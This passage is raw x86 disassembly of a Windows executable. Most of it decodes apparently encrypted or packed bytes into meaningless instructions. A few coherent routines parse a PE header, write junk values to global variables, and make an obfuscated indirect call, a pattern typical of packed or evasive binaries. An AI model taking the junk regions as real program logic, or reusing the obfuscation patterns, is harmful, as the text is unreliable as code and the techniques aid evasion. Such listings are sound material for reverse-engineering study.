  4112cb:	mov    bl,BYTE PTR [edi+ebp*1-0x3a7c9b59]
  4112d2:	xor    BYTE PTR [edx-0x4a5578ea],ch
  4112d8:	jo     0x4112bf
  4112da:	daa    
  4112db:	ins    BYTE PTR es:[edi],dx
  4112dc:	mov    cs,WORD PTR [ebp-0x4d]
  4112df:	div    esp
  4112e1:	xchg   ebp,eax
  4112e2:	and    ch,BYTE PTR [ecx+0x7c]
  4112e5:	bnd jg 0x4112f7
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x6368f61e,eax
  411318:	and    bh,BYTE PTR [ebp+0x7e4549f3]
  41131e:	jle    0x4112cf
  411320:	jl     0x4113a0
  411322:	jle    0x4112b3
  411324:	mov    esi,ebp
  411326:	lods   al,BYTE PTR ds:[esi]
  411327:	push   ebx
  411328:	xor    DWORD PTR ds:0x6807a692,ebx
  41132e:	out    dx,al
  41132f:	hlt    
  411330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411331:	sbb    ch,BYTE PTR [ebp+0x19]
  411334:	push   eax
  411335:	xchg   esi,eax
  411336:	push   esp
  411337:	out    0xfa,eax
  411339:	arpl   WORD PTR [eax],si
  41133b:	fldcw  WORD PTR [edi+0x14b7eb77]
  411341:	jg     0x411335
  411343:	cmp    bl,cl
  411345:	pushf  
  411346:	mov    edi,0xc77244aa
  41134b:	inc    ecx
  41134c:	jp     0x41135d
  41134e:	and    edi,DWORD PTR [eax+0x53]
  411351:	or     ah,bl
  411353:	xor    BYTE PTR [esi-0xf6281ff],ah
  411359:	and    DWORD PTR [edx+0x49],ebx
  41135c:	cmp    al,0xbf
  41135e:	xchg   ebp,eax
  41135f:	ss repz jp 0x411383
  411363:	lahf   
  411364:	xor    eax,0x44f25bfe
  411369:	cmp    BYTE PTR [edx-0x49],dh
  41136c:	es daa 
  41136e:	sub    edx,ebp
  411370:	inc    esi
  411371:	jb     0x4113af
  411373:	pop    esi
  411374:	lds    edi,FWORD PTR [ecx]
  411376:	popa   
  411377:	cmp    ebx,DWORD PTR [ebp-0x6a41092a]
  41137d:	push   edx
  41137e:	sbb    al,0x20
  411380:	jl     0x4113a1
  411382:	retf   
  411383:	push   esi
  411384:	dec    ecx
  411385:	ss aad 0x2
  411388:	cmp    BYTE PTR [edi+0x270bc5f8],bl
  41138e:	pop    esi
  41138f:	sbb    eax,0x9d91f28c
  411394:	jbe    0x411400
  411396:	xchg   BYTE PTR gs:[ebp+edx*4+0x4c94047c],ch
  41139e:	in     al,dx
  41139f:	aad    0xde
  4113a1:	fisttp WORD PTR [ebx]
  4113a3:	sahf   
  4113a4:	pop    esi
  4113a5:	xor    eax,0x27ab0ac0
  4113aa:	jecxz  0x4113e2
  4113ac:	cli    
  4113ad:	sbb    ebp,ebp
  4113af:	add    al,0x1
  4113b1:	mov    ah,0xb7
  4113b3:	push   ds
  4113b4:	pop    ss
  4113b5:	std    
  4113b6:	sbb    al,0x40
  4113b8:	and    BYTE PTR ds:0x36ffd9d8,cl
  4113be:	sub    BYTE PTR [edi-0x196da148],bh
  4113c4:	dec    edi
  4113c5:	hlt    
  4113c6:	xlat   BYTE PTR ds:[ebx]
  4113c7:	sub    al,0x9e
  4113c9:	je     0x411381
  4113cb:	rol    bh,cl
  4113cd:	icebp  
  4113ce:	iret   
  4113cf:	sbb    ah,dh
  4113d1:	pop    eax
  4113d2:	adc    al,0xaf
  4113d4:	pop    ds
  4113d5:	inc    esi
  4113d6:	sbb    edi,DWORD PTR [edi-0x6ecadf3a]
  4113dc:	mov    WORD PTR [edx-0x568959a5],?
  4113e2:	xor    eax,esp
  4113e4:	(bad)  
  4113e5:	mov    ebp,0xee67a90f
  4113ea:	mov    bl,0x27
  4113ec:	js     0x41143d
  4113ee:	cdq    
  4113ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113f0:	mov    ah,0x55
  4113f2:	fst    DWORD PTR [edx-0x32]
  4113f5:	inc    edi
  4113f6:	aad    0xca
  4113f8:	out    0x41,eax
  4113fa:	shr    ah,0x4c
  4113fd:	clc    
  4113fe:	test   BYTE PTR [eax],bl
  411400:	mov    esi,0xa8eb0283
  411405:	fxch   st(1)
  411407:	push   edx
  411408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411409:	icebp  
  41140a:	je     0x4113ff
  41140c:	out    dx,eax
  41140d:	data16 mov cl,0x5d
  411410:	mov    ah,0x68
  411412:	mov    al,0x26
  411414:	loope  0x4113e8
  411416:	fst    QWORD PTR [edx-0x6d]
  411419:	pop    edi
  41141a:	adc    cl,BYTE PTR [ebx-0x26]
  41141d:	in     al,dx
  41141e:	sbb    BYTE PTR [ecx],ch
  411420:	sbb    eax,eax
  411422:	sub    ebp,ecx
  411424:	mov    edi,0x90050b5c
  411429:	cmp    BYTE PTR [ebx],ah
  41142b:	jbe    0x4113ca
  41142d:	jo     0x41143b
  41142f:	mov    dh,dh
  411431:	cmp    eax,0x9866d376
  411436:	cmp    BYTE PTR [ebp+0x550c885d],ah
  41143c:	push   ecx
  41143d:	icebp  
  41143e:	xor    DWORD PTR [edx+0x29fffb42],eax
  411444:	mov    al,0xa5
  411446:	inc    ecx
  411447:	adc    eax,0xfc05dc2d
  41144c:	xor    edi,DWORD PTR [esp+esi*1]
  41144f:	fdiv   QWORD PTR [ebp+0xc]
  411452:	cmp    eax,0x69a9e3f3
  411457:	loop   0x4113ee
  411459:	push   cs
  41145a:	(bad)  [eax+0x7b]
  41145d:	psubd  mm1,QWORD PTR [eax]
  411460:	loope  0x411409
  411462:	(bad)  
  411463:	fnsave [ecx-0x62]
  411466:	hlt    
  411467:	push   es
  411468:	les    edi,FWORD PTR [edi+0x5cbf3d4e]
  41146e:	mov    ?,WORD PTR [esi]
  411470:	adc    BYTE PTR [edi+0x41806f97],dl
  411476:	lds    esp,FWORD PTR [edx+0x2f]
  411479:	or     BYTE PTR [eax],0x8
  41147c:	(bad)  
  41147d:	dec    edx
  41147e:	leave  
  41147f:	and    al,0x5a
  411481:	imul   ecx,eax,0x41ae29d7
  411487:	mov    DWORD PTR [edi*1-0x1610b8c6],edi
  41148e:	push   es
  41148f:	jge    0x411486
  411491:	xor    DWORD PTR [ebp+ebx*2-0x60550b1b],ebx
  411498:	cmp    cl,dl
  41149a:	xchg   edx,eax
  41149b:	jne    0x411501
  41149d:	(bad)  
  41149e:	mov    edx,0xbab745c7
  4114a3:	xor    DWORD PTR ds:0x9b8e6a19,esi
  4114a9:	pop    es
  4114aa:	xchg   ebx,eax
  4114ab:	ss je  0x41149d
  4114ae:	cmp    BYTE PTR [eax+esi*8],cl
  4114b1:	std    
  4114b2:	fsubr  st,st(7)
  4114b4:	sbb    cl,BYTE PTR [ecx+0x60199eac]
  4114ba:	loope  0x4114eb
  4114bc:	mov    BYTE PTR [ecx-0x729b2246],0x93
  4114c3:	rol    BYTE PTR [ebx-0x20],0x6
  4114c7:	push   ds
  4114c8:	stos   DWORD PTR es:[edi],eax
  4114c9:	xor    esi,edi
  4114cb:	pop    es
  4114cc:	pop    dx
  4114ce:	(bad)  
  4114cf:	stc    
  4114d0:	add    eax,0x1a86f245
  4114d5:	mov    ds:0x599ea09,eax
  4114da:	xor    DWORD PTR [eax-0x48],ebx
  4114dd:	and    edi,DWORD PTR [ebx-0x564368cb]
  4114e3:	jbe    0x4114c8
  4114e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e6:	dec    ebx
  4114e7:	sub    BYTE PTR [eax-0x45b910b5],0xdf
  4114ee:	push   esi
  4114ef:	add    BYTE PTR [eax+ecx*8],cl
  4114f2:	dec    edi
  4114f3:	sbb    bl,BYTE PTR [ebx+eax*2+0x26]
  4114f7:	mov    ds:0x68b36396,al
  4114fc:	rol    DWORD PTR [eax],cl
  4114fe:	loope  0x4114d0
  411500:	outs   dx,DWORD PTR ds:[esi]
  411501:	dec    ebp
  411502:	cdq    
  411503:	inc    ecx
  411504:	sub    bh,BYTE PTR [ebx]
  411506:	and    BYTE PTR gs:[esi+0x40],dh
  41150a:	cli    
  41150b:	mov    ds:0x41d7bea3,al
  411510:	inc    edx
  411511:	add    al,0x59
  411513:	into   
  411514:	mov    ds,WORD PTR [ecx-0x13866ce1]
  41151a:	pop    esp
  41151b:	(bad)  
  41151c:	sbb    bh,al
  41151e:	mov    al,BYTE PTR [esi+0x7e]
  411521:	fdivr  DWORD PTR [ebx+ebp*4]
  411524:	cmp    edx,DWORD PTR [ecx-0x5b]
  411527:	je     0x411592
  411529:	mov    al,0xac
  41152b:	(bad)  
  41152c:	(bad)  
  41152d:	es xchg esp,eax
  41152f:	(bad)  
  411531:	nop
  411532:	aam    0x6e
  411534:	dec    ebp
  411535:	ret    
  411536:	call   0xc815:0xf733425
  41153d:	mov    bh,0x95
  41153f:	add    al,cl
  411541:	icebp  
  411542:	mov    ebp,0xbe942ec6
  411547:	mov    ecx,0xbf41cb
  41154c:	(bad)  
  41154d:	xchg   esp,eax
  41154e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41154f:	jns    0x411526
  411551:	arpl   WORD PTR [ebp+0x4],si
  411554:	gs xor esi,DWORD PTR ss:[esi+0x73139974]
  41155c:	lahf   
  41155d:	inc    edi
  41155e:	sub    DWORD PTR [eax+0x2],ebp
  411561:	or     esp,DWORD PTR [ebx+0x43]
  411564:	das    
  411565:	test   al,0x39
  411567:	mov    ebx,esi
  411569:	aaa    
  41156a:	xor    eax,0x7f781490
  41156f:	loopne 0x4114f7
  411571:	jecxz  0x4115e6
  411573:	adc    eax,DWORD PTR [ebp-0x73]
  411576:	ss jmp 0x92967ca9
  41157c:	mov    eax,ds:0x5e984048
  411581:	dec    ecx
  411582:	pop    ss
  411583:	pop    es
  411584:	sbb    edx,DWORD PTR [esp+edi*4]
  411587:	repz scas eax,DWORD PTR es:[edi]
  411589:	sbb    eax,0x3a209da0
  41158e:	addr16 jbe 0x411545
  411591:	dec    edi
  411592:	jmp    0x4115a4
  411594:	mov    ds,WORD PTR [esi-0x4fe221e9]
  41159a:	inc    ecx
  41159b:	jge    0x4115f6
  41159d:	rcl    dh,cl
  41159f:	push   edi
  4115a0:	pop    ebp
  4115a1:	jecxz  0x411618
  4115a3:	jge    0x41160b
  4115a5:	jb     0x411554
  4115a7:	repz push esi
  4115a9:	xchg   ebp,eax
  4115aa:	xchg   esi,eax
  4115ab:	jg     0x4115b5
  4115ad:	shr    BYTE PTR [esi-0x12],0x53
  4115b1:	(bad)  
  4115b3:	dec    BYTE PTR [ecx]
  4115b5:	cmc    
  4115b6:	inc    eax
  4115b7:	mov    cl,0x4c
  4115b9:	popf   
  4115ba:	(bad)  
  4115bb:	mov    al,ds:0xce1cb9d8
  4115c0:	mov    eax,edx
  4115c2:	dec    esp
  4115c3:	or     DWORD PTR [edx+0x3ab37565],edx
  4115c9:	outs   dx,DWORD PTR ds:[esi]
  4115ca:	jle    0x41161d
  4115cc:	pop    es
  4115cd:	out    0xc,eax
  4115cf:	dec    edx
  4115d0:	cmp    BYTE PTR ds:0x558b6472,bh
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	sbb    DWORD PTR [edi+0x16],ebp
  41161b:	pop    ecx
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x411617
  411625:	cs inc ebx
  411627:	pop    ebp
  411628:	jnp    0x4115ab
  41162a:	int3   
  41162b:	and    eax,0xc83007ee
  411630:	rol    DWORD PTR [edx],cl
  411632:	outs   dx,BYTE PTR ds:[esi]
  411633:	enter  0x886b,0x10
  411637:	mov    bl,ch
  411639:	pop    ss
  41163a:	adc    DWORD PTR [eax],esi
  41163c:	retf   0xc1e4
  41163f:	ins    DWORD PTR es:[edi],dx
  411640:	add    al,BYTE PTR [edi+0x60]
  411643:	hlt    
  411644:	retfw  
  411646:	add    ch,0xab
  411649:	push   esi
  41164a:	shl    esp,cl
  41164c:	aas    
  41164d:	or     DWORD PTR [edx+0x25023c71],ecx
  411653:	nop
  411654:	add    ah,BYTE PTR [eax-0x6a]
  411657:	mov    cl,0xe5
  411659:	inc    edx
  41165a:	jno    0x41166f
  41165c:	es push edi
  41165e:	jg     0x411689
  411660:	call   0x26426b2d
  411665:	push   es
  411666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411667:	xor    DWORD PTR [ebp-0x7752d70d],edi
  41166d:	aas    
  41166e:	mov    ?,WORD PTR [edi-0x3d]
  411671:	rol    DWORD PTR [edx+ebp*2],0x12
  411675:	daa    
  411676:	pop    esi
  411677:	aam    0x2e
  411679:	cld    
  41167a:	cwde   
  41167b:	fnstsw WORD PTR [ebx+0x37]
  41167e:	fnsave [edi-0x20]
  411681:	push   0xfffffff3
  411683:	sub    cl,bl
  411685:	pusha  
  411686:	jp     0x4116ba
  411688:	jmp    0x3336702c
  41168d:	inc    eax
  41168e:	and    bh,BYTE PTR [edx]
  411690:	aas    
  411691:	jns    0x4116d3
  411693:	rol    al,0x7a
  411696:	jb     0x4116ed
  411698:	stos   DWORD PTR es:[edi],eax
  411699:	or     ebx,0x4d8225ff
  41169f:	xchg   esi,eax
  4116a0:	inc    esp
  4116a1:	pop    eax
  4116a2:	lock dec edi
  4116a4:	mov    dh,0x3f
  4116a6:	jne    0x411664
  4116a8:	jle    0x4116f5
  4116aa:	jl     0x41171e
  4116ac:	mov    DWORD PTR [ebx+0x7e],eax
  4116af:	retf   
  4116b0:	xchg   edx,eax
  4116b1:	(bad)  [edx+0x618257e4]
  4116b7:	push   esi
  4116b8:	jge    0x4116f5
  4116ba:	lods   eax,DWORD PTR ds:[esi]
  4116bb:	mov    ds:0xd0bcd5e5,eax
  4116c0:	iret   
  4116c1:	test   edi,0xb2beafae
  4116c7:	test   eax,0x50a0e5d5
  4116cc:	cmp    DWORD PTR [ebx+0x5f],ebp
  4116cf:	xchg   edx,eax
  4116d0:	dec    esi
  4116d1:	xor    dl,ch
  4116d3:	sbb    bl,BYTE PTR [ecx-0x72d253e0]
  4116d9:	lahf   
  4116da:	and    eax,0xb31b97bb
  4116df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e0:	cmp    eax,0x9fe8d952
  4116e5:	in     eax,dx
  4116e6:	ins    BYTE PTR es:[edi],dx
  4116e7:	test   BYTE PTR [edx-0x1f],0xb1
  4116eb:	lahf   
  4116ec:	scas   eax,DWORD PTR es:[edi]
  4116ed:	sbb    DWORD PTR [esi-0x42],0xffffffce
  4116f1:	(bad)  
  4116f2:	gs imul ebx,esp,0xb662387
  4116f9:	ja     0x411736
  4116fb:	jno    0x4116ad
  4116fd:	xor    BYTE PTR [esi-0x3a0a2a21],al
  411703:	loopne 0x411733
  411705:	fidivr DWORD PTR [ecx-0x3aba6ac5]
  41170b:	sbb    DWORD PTR [edi+0x7f],esp
  41170e:	mov    esp,0x55a052ed
  411713:	add    al,ah
  411715:	pop    edx
  411716:	adc    eax,0xb111ac32
  41171b:	xor    edx,DWORD PTR [ebp+0xc3e0040]
  411721:	in     eax,dx
  411722:	aad    0xdb
  411724:	xchg   BYTE PTR [edi+eiz*4],bl
  411727:	hlt    
  411728:	add    eax,0x413ce26c
  41172d:	sahf   
  41172e:	mov    ebx,0x3a774e3
  411733:	pop    esp
  411734:	jb     0x41171d
  411736:	int3   
  411737:	fld    QWORD PTR [ebp-0x77]
  41173a:	mov    bl,0x41
  41173c:	lods   eax,DWORD PTR ds:[esi]
  41173d:	pop    esi
  41173e:	addr16 ret 0x602c
  411742:	cld    
  411743:	int    0x6
  411745:	xchg   edi,eax
  411746:	xlat   BYTE PTR ds:[ebx]
  411747:	pushf  
  411748:	mov    bh,0x62
  41174a:	int    0xce
  41174c:	sbb    DWORD PTR [edx-0x764c2c61],edi
  411752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411753:	test   DWORD PTR [ebp+0x2fec174e],eax
  411759:	jmp    0xd88614b3
  41175e:	lods   eax,DWORD PTR ds:[esi]
  41175f:	shr    DWORD PTR [edx+ebp*8+0x67],cl
  411763:	xchg   edx,eax
  411764:	aaa    
  411765:	sbb    DWORD PTR [edi-0x4f575692],0x5f970f20
  41176f:	mov    bl,0x3e
  411771:	cmp    DWORD PTR [eax],ebx
  411773:	and    eax,0xc5565591
  411778:	mov    ebp,0x38587c2b
  41177d:	fwait
  41177e:	mov    WORD PTR [edx+0x6b],?
  411781:	inc    esp
  411782:	(bad)  
  411783:	push   eax
  411784:	ss cmp eax,0xb445368f
  41178a:	out    0x64,al
  41178c:	stos   BYTE PTR es:[edi],al
  41178d:	ret    0xc20
  411790:	fcomi  st,st(7)
  411792:	add    ebp,eax
  411794:	fwait
  411795:	(bad)  
  411796:	(bad)  
  411797:	inc    edx
  411798:	push   eax
  411799:	xchg   edi,eax
  41179a:	ja     0x411809
  41179c:	icebp  
  41179d:	enter  0x5e1f,0x39
  4117a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117a2:	push   edx
  4117a3:	adc    DWORD PTR [ecx],0x8377a0e1
  4117a9:	cwde   
  4117aa:	lea    eax,[esi+0x3b]
  4117ad:	jp     0x41180c
  4117af:	sbb    al,0x8f
  4117b1:	imul   esi,DWORD PTR [eax-0x917a48f],0x57
  4117b8:	jp     0x411744
  4117ba:	pop    esp
  4117bb:	ror    ebx,cl
  4117bd:	call   0x213:0xcf6e58c5
  4117c4:	xchg   esp,eax
  4117c5:	daa    
  4117c6:	jmp    0x472d:0x7138ba57
  4117cd:	(bad)  
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x4337a3,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4336ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43379f,0x433703
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43379f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43371b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4337ab,0x0
  41182f:	mov    eax,ds:0x4337ab
  411834:	inc    eax
  411835:	mov    ds:0x4337ab,eax
  41183a:	cmp    DWORD PTR ds:0x4337ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4338bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4337ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4337ab
  411899:	inc    eax
  41189a:	mov    ds:0x4337ab,eax
  41189f:	cmp    DWORD PTR ds:0x4337ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	repz inc edx
  4118e9:	push   ss
  4118ea:	or     BYTE PTR [esi+ecx*2],ch
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x41188c
  4118f4:	add    eax,0x604af8ac
  4118f9:	mov    dh,0x18
  4118fb:	in     eax,dx
  4118fc:	push   ebp
  4118fd:	icebp  
  4118fe:	xor    ah,al
  411900:	mov    cl,0xb7
  411902:	mov    ebx,DWORD PTR [esi+0xd]
  411905:	popf   
  411906:	mov    ch,0x79
  411908:	mov    dl,0xbe
  41190a:	jmp    0x4118f0
  41190c:	jns    0x4118ca
  41190e:	aam    0x5b
  411910:	imul   ebx,DWORD PTR [esi-0x67],0x1a
  411914:	icebp  
  411915:	pop    edi
  411916:	out    dx,eax
  411917:	cdq    
  411918:	dec    esp
  411919:	inc    edi
  41191a:	cs cli 
  41191c:	xor    eax,0xbe3e94a6
  411921:	push   0xccd33e7b
  411926:	lods   eax,DWORD PTR ds:[esi]
  411927:	mov    al,0xbf
  411929:	add    eax,0x13300c29
  41192e:	xchg   ecx,eax
  41192f:	cmp    eax,0xe861bae8
  411934:	sub    al,0x46
  411937:	stos   BYTE PTR es:[edi],al
  411938:	or     al,0xb2
  41193a:	cwde   
  41193b:	mov    dl,0xef
  41193d:	shr    BYTE PTR [esi+0x3f],0x39
  411941:	in     eax,dx
  411942:	adc    BYTE PTR [esi+edx*1],bh
  411945:	push   ebp
  411946:	addr16 pop edi
  411948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411949:	pop    ebp
  41194a:	mov    DWORD PTR [eax-0x7525413c],eax
  411950:	jo     0x41199d
  411952:	cmp    esi,ebx
  411954:	cmp    BYTE PTR [ecx-0x7c6fdd06],cl
  41195a:	pop    edi
  41195b:	ds cld 
  41195d:	jbe    0x4118f5
  41195f:	or     eax,0x3c62b54f
  411964:	mov    dh,0xc8
  411966:	leave  
  411967:	cs jmp 0xd49b:0xd51d2414
  41196f:	enter  0xf067,0xd2
  411973:	xor    ecx,DWORD PTR [ebp-0xa]
  411976:	or     ecx,DWORD PTR [eax-0x3f]
  411979:	loope  0x4119d6
  41197b:	jbe    0x4119ee
  41197d:	sar    DWORD PTR [edx+edx*1],0xe
  411981:	sbb    al,0x46
  411983:	std    
  411984:	aas    
  411985:	addr16 xchg esi,eax
  411987:	(bad)  
  411988:	xchg   ecx,eax
  411989:	cwde   
  41198a:	js     0x411930
  41198c:	dec    edx
  41198d:	test   DWORD PTR gs:[eax],0xf8dbafb6
  411994:	movhlps xmm0,xmm0
  411997:	sbb    bh,BYTE PTR [edx+0x7b]
  41199a:	cwde   
  41199b:	sub    DWORD PTR [esp+edx*4-0xf],0xd1d18a4d
  4119a3:	or     DWORD PTR [ecx+eiz*1-0x3d29b084],esp
  4119aa:	sbb    ah,ch
  4119ac:	xchg   BYTE PTR [eax-0x182f84e4],al
  4119b2:	enter  0x58c5,0x9d
  4119b6:	sub    al,0x23
  4119b8:	jp     0x411950
  4119ba:	mov    edx,ds
  4119bc:	xchg   BYTE PTR [ecx-0x77e1b90f],ah
  4119c2:	fwait
  4119c3:	stc    
  4119c4:	dec    esi
  4119c5:	xor    eax,DWORD PTR [edx]
  4119c7:	popa   
  4119c8:	mov    ebx,0x20679e67
  4119cd:	and    BYTE PTR [eax],ch
  4119cf:	lock push ss
  4119d1:	or     bh,BYTE PTR [edx]
  4119d3:	out    dx,eax
  4119d4:	dec    ebp
  4119d5:	xchg   DWORD PTR [ebx+0x25380f76],eax
  4119db:	in     al,dx
  4119dc:	mov    esi,0xce9ed7b9
  4119e1:	push   0xfe0514df
  4119e6:	or     DWORD PTR [edi+0x1f64fbcc],esp
  4119ec:	fcmovnbe st,st(7)
  4119ee:	in     al,0x7f
  4119f0:	div    eax
  4119f2:	jge    0x411a2b
  4119f4:	xchg   DWORD PTR [ebx-0x4fcd0f19],eax
  4119fa:	push   0x976cd811
  4119ff:	ins    DWORD PTR es:[edi],dx
  411a00:	dec    eax
  411a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a02:	xchg   BYTE PTR [ebp+0x26],cl
  411a05:	sbb    eax,0x872316e8
  411a0a:	popf   
  411a0b:	mov    edi,eax
  411a0d:	fstp   QWORD PTR [ebx-0x5]
  411a10:	fbstp  TBYTE PTR [edi-0x6526a7dc]
  411a16:	shl    BYTE PTR [eax],0x6d
  411a19:	and    DWORD PTR [esp+esi*4],ecx
  411a1c:	pushf  
  411a1d:	mov    bl,0x2b
  411a1f:	dec    ebx
  411a20:	lock add DWORD PTR [esi],esi
  411a23:	mov    WORD PTR [edi-0x3b457226],ss
  411a29:	and    eax,0x2221826b
  411a2e:	cmp    eax,0xca791629
  411a33:	arpl   si,bp
  411a35:	into   
  411a36:	in     eax,0x54
  411a38:	xor    BYTE PTR [ebp-0x59e500f3],0x7d
  411a3f:	inc    edx
  411a40:	inc    esi
  411a41:	int3   
  411a42:	out    0x93,al
  411a44:	add    eax,esi
  411a46:	fiadd  WORD PTR [edi-0x23]
  411a49:	iret   
  411a4a:	jp     0x411a9e
  411a4c:	sbb    eax,0x8b544277
  411a51:	adc    ch,ch
  411a53:	mov    ecx,0xc1ef8773
  411a58:	pop    esi
  411a59:	loop   0x411ab0
  411a5b:	pop    esi
  411a5c:	ror    DWORD PTR [edx],0x37
  411a5f:	pop    edx
  411a60:	cmp    BYTE PTR [esi+0x6b],bh
  411a63:	jl     0x411ab4
  411a65:	push   ss
  411a66:	jne    0x4119f7
  411a68:	add    DWORD PTR [ecx+0x76],ecx
  411a6b:	xchg   edi,eax
  411a6c:	in     eax,0x6f
  411a6e:	push   es
  411a6f:	sub    eax,0xf136fa15
  411a74:	pusha  
  411a75:	jge    0x411a85
  411a77:	jecxz  0x411af5
  411a79:	and    eax,0x388e74f7
  411a7e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  411a80:	fbld   TBYTE PTR [ebx-0x37d57737]
  411a86:	out    dx,eax
  411a87:	data16 cld 
  411a89:	jo     0x411ae6
  411a8b:	add    ecx,edi
  411a8d:	pop    eax
  411a8e:	mov    edx,0xc52ae405
  411a93:	sbb    ecx,DWORD PTR [eax]
  411a95:	jae    0x411b06
  411a97:	nop    DWORD PTR [edx]
  411a9a:	(bad)  
  411a9b:	loopne 0x411ab9
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
